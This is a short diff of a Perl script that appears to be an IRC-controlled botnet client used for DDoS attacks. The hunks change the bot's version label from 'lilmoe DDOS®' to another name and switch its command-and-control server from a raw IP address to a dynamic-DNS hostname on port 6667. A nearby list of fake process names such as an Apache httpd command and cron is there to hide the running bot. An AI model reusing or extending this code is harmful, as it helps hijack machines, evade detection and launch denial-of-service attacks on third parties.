@@ -45,7 +45,7 @@ my @rps = ("/usr/local/apache/bin/httpd -DSSL",
            "/usr/sbin/cron");
 my $process = $rps[rand scalar @rps];
  
-my @rversion = ("lilmoe DDOS®");
+my @rversion = ("James Â®");
 my $vers = $rversion[rand scalar @rversion];
  
 my @rircname = ("Linux");
@@ -57,7 +57,7 @@ chop (my $realname = $rircname[rand scalar @rircname]);
  
 my $nick =$rircname[rand scalar @rircname];
  
-$server = '94.72.141.132' unless $server;
+$server = 'lilmoe.mooo.com' unless $server;
 my $port = '6667';
  
 my $linas_max='8';
